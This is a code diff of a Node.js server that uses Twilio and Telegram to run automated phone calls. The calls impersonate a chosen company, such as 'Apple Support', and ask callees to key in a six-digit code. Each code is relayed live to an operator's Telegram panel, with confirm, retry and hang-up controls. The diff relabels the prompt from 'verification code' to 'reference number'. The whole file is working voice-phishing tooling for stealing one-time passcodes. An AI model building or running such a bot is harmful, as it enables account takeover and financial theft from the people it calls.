@@ -1,35 +1,43 @@
-const express=require("express")
-const bodyParser=require("body-parser")
-const fetch=require("node-fetch")
-const twilio=require("twilio")
+const express = require("express")
+const bodyParser = require("body-parser")
+const fetch = require("node-fetch")
+const twilio = require("twilio")
 
-const app=express()
+const app = express()
 app.use(bodyParser.urlencoded({extended:false}))
 app.use(bodyParser.json())
 
-const PORT=process.env.PORT||3000
+const PORT = process.env.PORT || 3000
 
 // ===== ENV =====
-const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
-const CHAT_ID=process.env.CHAT_ID
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
+const CHAT_ID = process.env.CHAT_ID
 
-const TWILIO_ACCOUNT_SID=process.env.TWILIO_ACCOUNT_SID
-const TWILIO_AUTH_TOKEN=process.env.TWILIO_AUTH_TOKEN
-const TWILIO_NUMBER=process.env.TWILIO_NUMBER
+const TWILIO_ACCOUNT_SID =
+process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID
 
-const BASE_URL=process.env.BASE_URL
+const TWILIO_AUTH_TOKEN =
+process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN
 
-const client=twilio(TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN)
+const TWILIO_NUMBER = process.env.TWILIO_NUMBER
+const BASE_URL = process.env.BASE_URL
+
+const client = twilio(
+TWILIO_ACCOUNT_SID,
+TWILIO_AUTH_TOKEN
+)
 
 // ===== SETTINGS =====
-let settings={
+let settings = {
 company:"Support",
 digits:6,
 assistant:0,
-itemName:"verfication code"
+itemName:"reference number",
+maxRetries:3,
+paused:false
 }
 
-const assistants=[
+const assistants = [
 {name:"Nova",voice:"Polly.Joanna"},
 {name:"Lyra",voice:"Polly.Matthew"},
 {name:"Orion",voice:"Polly.Amy"},
@@ -39,65 +47,80 @@ const assistants=[
 ]
 
 // ===== STATE =====
-const calls=new Map()
+const calls = new Map()
 
-let lastCaller=null
-let lastDialed=null
+let lastCaller = null
+let lastDialed = null
 
-let logs=[]
-let panelMessageId=null
-let pendingInput=null
+let logs = []
+let history = []
+
+let stats = {
+inbound:0,
+outbound:0,
+inputs:0,
+confirmed:0,
+retries:0,
+hungup:0
+}
+
+let panelMessageId = null
+let pendingInput = null
 
 // ===== HELPERS =====
-
 function assistant(){
-return assistants[settings.assistant]||assistants[0]
+return assistants[settings.assistant]
 }
 
 function pushLog(text){
 logs.unshift(`${new Date().toLocaleTimeString()} ${text}`)
-logs=logs.slice(0,20)
+logs = logs.slice(0,30)
 }
 
-function getOrCreateCall(callSid){
-if(!callSid)return null
+function pushHistory(text){
+history.unshift(`${new Date().toLocaleString()} ${text}`)
+history = history.slice(0,100)
+}
 
-if(!calls.has(callSid)){
-calls.set(callSid,{
-sid:callSid,
+function getCall(sid){
+
+if(!calls.has(sid)){
+
+calls.set(sid,{
+sid,
 caller:null,
 input:null,
 status:"Idle",
-startedAt:Date.now()
+startedAt:Date.now(),
+retries:0
 })
+
 }
 
-return calls.get(callSid)
+return calls.get(sid)
 }
 
-function sortedCalls(){
-return Array.from(calls.values()).sort((a,b)=>(b.startedAt||0)-(a.startedAt||0))
-}
+function callTime(call){
 
-function callTimerText(call){
-if(!call)return"00:00"
+const sec=Math.floor((Date.now()-call.startedAt)/1000)
 
-const total=Math.floor((Date.now()-call.startedAt)/1000)
+const m=String(Math.floor(sec/60)).padStart(2,"0")
+const s=String(sec%60).padStart(2,"0")
 
-const mm=String(Math.floor(total/60)).padStart(2,"0")
-const ss=String(total%60).padStart(2,"0")
-
-return`${mm}:${ss}`
+return `${m}:${s}`
 }
 
 // ===== TELEGRAM =====
-
 async function tg(method,data){
-const res=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
+
+const res=await fetch(
+`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
+{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify(data)
 })
+
 return res.json()
 }
 
@@ -113,14 +136,13 @@ body.reply_markup={inline_keyboard:buttons}
 }
 
 return tg("sendMessage",body)
-
 }
 
-async function tgEdit(messageId,text,buttons=null){
+async function tgEdit(id,text,buttons=null){
 
 const body={
 chat_id:CHAT_ID,
-message_id:messageId,
+message_id:id,
 text
 }
 
@@ -129,143 +151,129 @@ body.reply_markup={inline_keyboard:buttons}
 }
 
 return tg("editMessageText",body)
-
-}
-
-async function tgAnswerCallback(id,text=""){
-try{
-await tg("answerCallbackQuery",{callback_query_id:id,text})
-}catch{}
 }
 
 // ===== PANEL =====
-
 function panelButtons(){
 
-return[
+return [
+
 [
 {text:"✔ Confirm",callback_data:"confirm"},
 {text:"🔁 Retry",callback_data:"retry"}
 ],
+
 [
 {text:"⛔ Hang Up",callback_data:"hangup"}
 ],
+
 [
 {text:"📞 Call Last",callback_data:"calllast"},
 {text:"📲 Call",callback_data:"call"}
 ],
+
+[
+{text:"⏸ Pause",callback_data:"pause"},
+{text:"▶ Resume",callback_data:"resume"}
+],
+
 [
 {text:"⚡ Wake Server",callback_data:"wake"}
 ],
+
 [
 {text:"📊 Status",callback_data:"status"},
 {text:"📜 Logs",callback_data:"logs"}
 ]
+
 ]
 
 }
 
 function panelText(){
 
-const active=sortedCalls().slice(0,6)
+const active=[...calls.values()]
+.filter(c=>c.status!=="Ended")
+.slice(0,6)
 
-let lines=["📞 LIVE CALLS",""]
+let text="📞 LIVE CALLS\n\n"
 
 if(!active.length){
-
-lines.push("No active calls")
-
+text+="No active calls\n\n"
 }else{
 
-active.forEach((call,i)=>{
+active.forEach((c,i)=>{
 
-lines.push(`${i+1}) ${call.status}`)
-lines.push(`Caller: ${call.caller||"Unknown"}`)
-lines.push(`${settings.itemName}: ${call.input||"waiting"}`)
-lines.push(`Time: ${callTimerText(call)}`)
-lines.push("")
+text+=`${i+1}) ${c.status}\n`
+text+=`Caller: ${c.caller||"Unknown"}\n`
+text+=`${settings.itemName}: ${c.input||"waiting"}\n`
+text+=`Retries: ${c.retries}/${settings.maxRetries}\n`
+text+=`Time: ${callTime(c)}\n\n`
 
 })
 
 }
 
-lines.push(`Company: ${settings.company}`)
-lines.push(`Digits: ${settings.digits}`)
-lines.push(`Assistant: ${assistant().name}`)
-lines.push(`Item: ${settings.itemName}`)
+text+=`Company: ${settings.company}\n`
+text+=`Digits: ${settings.digits}\n`
+text+=`Assistant: ${assistant().name}\n`
+text+=`Item: ${settings.itemName}\n`
+text+=`Paused: ${settings.paused?"Yes":"No"}`
 
-return lines.join("\n")
-
+return text
 }
 
-async function updatePanel(forceNew=false){
-
-try{
+async function updatePanel(force=false){
 
 const text=panelText()
 const buttons=panelButtons()
 
-if(!panelMessageId||forceNew){
+if(!panelMessageId||force){
 
 const msg=await tgSend(text,buttons)
 
-if(msg.result)panelMessageId=msg.result.message_id
+if(msg.result){
+panelMessageId=msg.result.message_id
+}
 
 return
-
 }
 
 await tgEdit(panelMessageId,text,buttons)
 
-}catch{}
-
 }
 
 // ===== CALL CONTROL =====
-
 async function startCall(number){
 
-if(!number)return
+if(settings.paused){
+await tgSend("⏸ Calling paused")
+return
+}
 
 lastDialed=number
+stats.outbound++
 
 await client.calls.create({
 url:`${BASE_URL}/ivr`,
 to:number,
 from:TWILIO_NUMBER,
 statusCallback:`${BASE_URL}/call-status`,
-statusCallbackEvent:["initiated","ringing","answered","completed"],
+statusCallbackEvent:[
+"initiated",
+"ringing",
+"answered",
+"completed"
+],
 statusCallbackMethod:"POST"
 })
 
-pushLog(`Outbound call started to ${number}`)
+pushLog(`Outbound call to ${number}`)
+pushHistory(`Outbound call ${number}`)
 
 }
 
-function newestActiveCall(){
-return sortedCalls().find(c=>c.status!=="Ended")||null
-}
-
-async function updateLiveCallTwiml(callSid,twiml){
-
-if(!callSid)return
-
-await client.calls(callSid).update({twiml})
-
-}
-
-async function endLiveCallImmediately(callSid){
-
-if(!callSid)return
-
-await client.calls(callSid).update({
-twiml:`<Response><Hangup/></Response>`
-})
-
-}
-
-// ===== ROOT =====
-
+// ===== ROUTES =====
 app.get("/",(req,res)=>{
 res.send("Server running")
 })
@@ -274,24 +282,30 @@ app.get("/ping",(req,res)=>{
 res.send("pong")
 })
 
+app.get("/health",(req,res)=>{
+res.json({
+status:"ok",
+calls:calls.size,
+paused:settings.paused
+})
+})
+
 // ===== CALL STATUS =====
+app.post("/call-status",async(req,res)=>{
 
-app.post("/call-status",(req,res)=>{
-
-const status=req.body.CallStatus
-const from=req.body.From
 const sid=req.body.CallSid
+const from=req.body.From
+const status=req.body.CallStatus
 
-const call=getOrCreateCall(sid)
-
-if(call){
+const call=getCall(sid)
 
 if(from)call.caller=from
 
 if(status==="ringing")call.status="Ringing"
 if(status==="in-progress")call.status="Answered"
-if(status==="completed")call.status="Ended"
 
+if(status==="completed"){
+call.status="Ended"
 }
 
 updatePanel()
@@ -301,23 +315,57 @@ res.sendStatus(200)
 })
 
 // ===== IVR =====
-
 app.post("/ivr",(req,res)=>{
 
 const sid=req.body.CallSid
 const from=req.body.From
 
-const call=getOrCreateCall(sid)
-
-if(call){
+const call=getCall(sid)
 
 call.caller=from
 call.status="Answered"
-call.startedAt=Date.now()
 
-}
+stats.inbound++
 
 lastCaller=from
+
+res.type("text/xml")
+
+res.send(`
+<Response>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST">
+<Say voice="${assistant().voice}">
+Hello im calling from ${settings.company}.
+Please enter your ${settings.digits} digit ${settings.itemName}.
+</Say>
+</Gather>
+<Redirect method="POST">${BASE_URL}/ivr</Redirect>
+</Response>
+`)
+
+})
+
+// ===== INPUT =====
+app.post("/input",async(req,res)=>{
+
+const digits=req.body.Digits
+const sid=req.body.CallSid
+const caller=req.body.From
+
+const call=getCall(sid)
+
+call.input=digits
+call.caller=caller
+
+stats.inputs++
+
+pushLog(`${caller} : ${digits}`)
+pushHistory(`${caller} -> ${digits}`)
+
+await tgSend(`📞 INPUT RECEIVED
+
+Caller: ${caller}
+${settings.itemName}: ${digits}`)
 
 updatePanel()
 
@@ -326,277 +374,185 @@ res.type("text/xml")
 res.send(`
 <Response>
 <Say voice="${assistant().voice}">
-Hello im calling from ${settings.company}. Please enter your ${settings.digits} digit ${settings.itemName}.
+Please wait while we review your ${settings.itemName}.
 </Say>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST"/>
+<Pause length="10"/>
 <Redirect method="POST">${BASE_URL}/ivr</Redirect>
 </Response>
 `)
 
 })
 
-// ===== INPUT =====
-
-app.post("/input",async(req,res)=>{
-
-const digits=req.body.Digits
-const caller=req.body.From
-const sid=req.body.CallSid
-
-const call=getOrCreateCall(sid)
-
-if(call){
-
-call.caller=caller
-call.input=digits
-call.status="Answered"
-call.startedAt=Date.now()
-
-}
-
-lastCaller=caller
-
-pushLog(`${caller} : ${digits}`)
-
-res.type("text/xml")
-
-res.send(`
-<Response>
-<Say voice="${assistant().voice}">
-Please wait while we review your ${settings.itemName}.
-</Say>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
-</Response>
-`)
-
-await tgSend(`📞 INPUT RECEIVED
-
-Caller: ${caller}
-${settings.itemName}: ${digits}`)
-
-await updatePanel()
-
-})
-
-// ===== HOLD LOOP =====
-
-app.post("/hold",(req,res)=>{
-
-res.type("text/xml")
-
-res.send(`
-<Response>
-<Pause length="10"/>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
-</Response>
-`)
-
-})
-
 // ===== TELEGRAM =====
-
 app.post("/telegram",async(req,res)=>{
 
 const update=req.body
 
 try{
 
+// BUTTONS
 if(update.callback_query){
 
 const action=update.callback_query.data
-const callbackId=update.callback_query.id
+const call=[...calls.values()].find(c=>c.status!=="Ended")
 
-const call=newestActiveCall()
-const callSid=call?call.sid:null
+if(action==="confirm"&&call){
 
-if(action==="confirm"){
-
-if(callSid){
-
-await updateLiveCallTwiml(callSid,`
+await client.calls(call.sid).update({
+twiml:`
 <Response>
 <Say voice="${assistant().voice}">
-Thank you. Your ${settings.itemName} has been confirmed.
+Thank you your ${settings.itemName} has been confirmed
 </Say>
 <Hangup/>
 </Response>
-`)
+`
+})
 
 call.status="Ended"
-pushLog("Confirmed")
+
+stats.confirmed++
 
 }
 
-await updatePanel()
-await tgAnswerCallback(callbackId,"Confirmed")
+if(action==="retry"&&call){
 
-}
+call.retries++
 
-if(action==="retry"){
+if(call.retries>=settings.maxRetries){
 
-if(callSid){
-
-await updateLiveCallTwiml(callSid,`
+await client.calls(call.sid).update({
+twiml:`
 <Response>
-<Say voice="${assistant().voice}">
-Please re-enter your ${settings.itemName}.
-</Say>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/input"/>
+<Say>Verification failed</Say>
+<Hangup/>
 </Response>
-`)
-
-call.input=null
-
-pushLog("Retry requested")
-
-}
-
-await updatePanel()
-await tgAnswerCallback(callbackId,"Retry sent")
-
-}
-
-if(action==="hangup"){
-
-if(callSid){
-
-await endLiveCallImmediately(callSid)
-
-call.status="Ended"
-
-pushLog("Hung up")
-
-}
-
-await updatePanel()
-await tgAnswerCallback(callbackId,"Hung up")
-
-}
-
-if(action==="wake"){
-
-await fetch(BASE_URL)
-await fetch(BASE_URL+"/ping")
-await fetch(BASE_URL+"/ivr")
-
-await tgSend("⚡ Server wake request sent")
-
-await tgAnswerCallback(callbackId,"Server waking")
-
-}
-
-if(action==="calllast"){
-
-if(lastDialed){
-
-await startCall(lastDialed)
-
-await tgSend(`📞 Calling last dialed number ${lastDialed}`)
+`
+})
 
 }else{
 
-await tgSend("No previous outbound call")
+await client.calls(call.sid).update({
+twiml:`
+<Response>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input">
+<Say>Please re enter your ${settings.itemName}</Say>
+</Gather>
+</Response>
+`
+})
 
 }
 
-await tgAnswerCallback(callbackId,"Calling")
+stats.retries++
 
 }
 
-if(action==="call"){
+if(action==="hangup"&&call){
 
-pendingInput="call"
+await client.calls(call.sid).update({
+twiml:`<Response><Hangup/></Response>`
+})
 
-await tgSend("Send number to call")
+call.status="Ended"
 
-await tgAnswerCallback(callbackId,"Waiting for number")
-
-}
-
-if(action==="status"){
-
-await updatePanel()
-
-await tgAnswerCallback(callbackId,"Panel refreshed")
+stats.hungup++
 
 }
 
-if(action==="logs"){
+if(action==="calllast"&&lastDialed){
+await startCall(lastDialed)
+}
 
-let text="📜 Logs\n\n"
+if(action==="pause"){
+settings.paused=true
+}
 
-logs.forEach(l=>text+=l+"\n")
+if(action==="resume"){
+settings.paused=false
+}
 
-await tgSend(text)
+if(action==="wake"){
+await fetch(BASE_URL)
+await fetch(BASE_URL+"/ping")
+await tgSend("⚡ Server wake request sent")
+}
 
-await tgAnswerCallback(callbackId,"Logs sent")
+updatePanel()
 
 }
 
-}
-
+// COMMANDS
 if(update.message&&update.message.text){
 
 const text=update.message.text.trim()
 
-if(pendingInput==="call"&&!text.startsWith("/")){
-
-pendingInput=null
-
-await startCall(text)
-
-await tgSend(`📞 Calling ${text}`)
-
-return res.sendStatus(200)
-
-}
-
-if(text==="/panel"||text==="/menu"||text==="/status"){
-
+if(text==="/panel"||text==="/menu"){
 panelMessageId=null
 await updatePanel(true)
-
 }
 
 if(text==="/logs"){
+await tgSend(logs.join("\n"))
+}
 
-let textOut="📜 Logs\n\n"
+if(text==="/history"){
+await tgSend(history.join("\n"))
+}
 
-logs.forEach(l=>textOut+=l+"\n")
+if(text==="/stats"){
 
-await tgSend(textOut)
+await tgSend(`Stats
+
+Inbound: ${stats.inbound}
+Outbound: ${stats.outbound}
+Inputs: ${stats.inputs}
+Confirmed: ${stats.confirmed}
+Retries: ${stats.retries}
+HungUp: ${stats.hungup}`)
 
 }
-if(text.startsWith("/item")){
 
-const name=text.replace("/item","").trim()
+if(text.startsWith("/call ")){
 
-if(!name){
-await tgSend("Usage: /item ticket number")
-}else{
-settings.itemName=name
-await tgSend(`📝 Item set to ${settings.itemName}`)
-await updatePanel()
+const number=text.split(" ")[1]
+await startCall(number)
+
 }
+
 if(text.startsWith("/company")){
 
-const name=text.replace("/company","").trim()
-
-if(!name){
-await tgSend("Usage: /company Apple Support")
-}else{
-settings.company=name
-await tgSend(`🏢 Company set to ${settings.company}`)
-await updatePanel()
-}
+settings.company=text.replace("/company","").trim()
+updatePanel()
 
 }
+
+if(text.startsWith("/item")){
+
+settings.itemName=text.replace("/item","").trim()
+updatePanel()
+
 }
+
+if(text.startsWith("/digits")){
+
+settings.digits=parseInt(text.split(" ")[1])
+updatePanel()
+
+}
+
+if(text.startsWith("/assistant")){
+
+settings.assistant=parseInt(text.split(" ")[1])-1
+updatePanel()
+
+}
+
 }
 
 }catch(e){
 
-console.log("/telegram error:",e.message)
+console.log("/telegram error",e.message)
 
 }
 
@@ -604,14 +560,17 @@ res.sendStatus(200)
 
 })
 
-// ===== LIVE PANEL =====
-
+// ===== PANEL REFRESH =====
 setInterval(()=>{
 
-if(panelMessageId)updatePanel()
+if(panelMessageId){
+updatePanel()
+}
 
 },1000)
 
 app.listen(PORT,()=>{
+
 console.log("Server booted and ready for calls")
+
 })
